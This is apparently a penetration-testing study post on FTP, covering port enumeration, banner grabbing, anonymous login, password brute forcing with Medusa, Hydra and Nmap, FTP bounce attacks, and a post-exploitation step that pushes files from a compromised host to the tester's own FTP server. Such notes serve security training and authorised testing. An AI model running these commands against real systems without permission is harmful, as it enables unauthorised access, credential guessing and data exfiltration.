---
layout: post
title: "FTP Overview"
---

# Basic Information

The [File Transfer Protocol](https://en.wikipedia.org/wiki/File_Transfer_Protocol) (`FTP`) is a standard protocol used to transfer files across a network.
By default, FTP listens on port `TCP/21`.

```shell-session
PORT   STATE SERVICE
21/tcp open  ftp
```

After gaining access to the FTP Service, we can search for sensitive or critical information.

We can download and upload files with commands the **GET**, **MGET** and **PUT**, **MPUT** commands. _Note that depending on FTP client, commands can vary._

# Enumeration

## Nmap

Standard `Nmap` flags `-sC` and `-sV` provide basic FTP enumeration.

The `-sC` default scripts includes the [ftp-anon](https://nmap.org/nsedoc/scripts/ftp-anon.html) that checks if a FTP server allows anonymous logins and the version enumeration flag `-sV` provides information about FTP services, like the FTP banner.

```shell-session
sudo nmap -sC -sV -p 21 {IP}
```

More scipts can be found [here](https://nmap.org/nsedoc/scripts/)

```shell-session
nmap --script=ftp-anon,ftp-bounce,ftp-brute,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 {IP}
```

```shell-session
nmap --script=ftp-* -p 21 $ip
```

## Banner Grabbing

To quickly find the version we can grab a Banner.

```shell-session
nc -vv -p 21 {IP}
```

```shell-session
telnet {IP} 21
```

```shell-session
nmap -sV -script banner -p21 -Pn {IP}
```

Once the Banner discloses the the version running on FTP server, we can use `searchsploit` -> `<FTP name and version>` to hopefully get some already existing exploits.

# Connect

FTP:
```shell-session
ftp {IP} {PORT}
```

lftp:
```shell-session
lftp {IP}
```

Web Browser:
```shell-session
ftp://username:password@{IP}
```

## Anonymous Authentication

The protocol supports anonymous access, where users can log in with a `anonymous` username and no password.

```shell-session
ftp {IP}
                     
Connected to {IP}.
220 (vsFTPd 2.3.4)
Name ({IP}:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

# Attack Vectors

## Brute Forcing

If there is no anonymous authentication available, we can also try to brute-force the login for the FTP services.
There are many different tools to perform a brute-forcing attack.

With ==`Medusa`==, we can use the option ==`-u`== to specify a single user to target, or you can use the option ==`-U`== to provide a file with a list of usernames. The option ==`-P`== is for a file containing a list of passwords. We can use the option ==`-M`== and the protocol we are targeting (FTP) and the option ==`-h`== for the target hostname or IP address.

**Note:** Most applications today prevent brute-forcing attacks. A more effective method is Password Spraying.

### Brute Forcing with Medusa

```shell-session
medusa -u user -P /wordlists/rockyou.txt -h {IP} -M ftp 
```

* `-u` - specify username
* `-U` - list of usernames
* `-P` - list of passwords
* `-M` - protocol (FTP)
* `-h` - target hostname or IP address


### Brute Forcing with Hydra
```shell-session
hydra -l user -P /wordlists/rockyou.txt -f {IP} ftp
```

* `-l` - specify username
* `-L` - list of usernames
* `-P` - list of passwords
* `-f` - exit after the first found user/password pair
*      - specify service (FTP)

### Brute Forcing with Nmap

It is also possible to perform brute force on FTP with `Nmap` script:

```shell-session
nmap -p 21 --script ftp-brute {IP}
```

## FTP Bounce Attack

FTP Bounce Attack is a network attack that exploits the FTP protocol's ability to redirect traffic, masking the attack source. 
It uses an FTP server's **PORT** command to route data to a third party, making the attack seem to originate from the server.

[https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/](https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/)
[FTP Bounce Attack](https://www.linux.org/threads/nmap-ftp-bounce-attack.4493/)

### Attack Execution

1. Find an FTP server that doesn't restrict the **PORT** command

2. Connect to the FTP server
```shell-session
ftp {IP}
```

3. Use **PORT** to redirect data to the target
```shell-session
quote PORT target_IP,port
```

4. Initiate a file transfer to the target
```shell-session
get sample-filename
```

This requests a file from the FTP server, which is then sent to the specified target, exploiting the bounce capability.

### Bounce Attack with Nmap

The `Nmap` `-b` flag can be used to perform an FTP bounce attack

```shell-session
nmap -b {FTP_SERVER_IP}:{PORT} {TARGET_NETWORK}
```

```shell-session
nmap -Pn -v  -p 80 -b anonymous:password@10.10.10.11 172.15.0.2
```

Modern FTP servers include protections that, by default, prevent this type of attack, but if these features are misconfigured, the server can become vulnerable.

### Bounce Attack with Metasploit

Metasploit offers module that leverage FTP bounce.

```shell-session
use auxiliary/scanner/ftp/ftp_bounce
set RHOSTS {FTP_IP}
set RPORT {FTP_PORT}
run
```

This scans through the vulnerable FTP server to find open ports on other systems.

## Post-Exploitation File Transfer

After getting a foothold in target system we usually want to transfer more files in, or exfiltrate data.
My favourite way is to set up FTP server.

```shell-session
sudo python3 -m pyftpdlib --port 21 --write
```

Connect to it on target system and transfer whatever is needed.

```powershell
C:\> ftp {MY_IP}
User: anonymous
Password: anonymous
ftp> binary
ftp> put sample_file.txt
```

~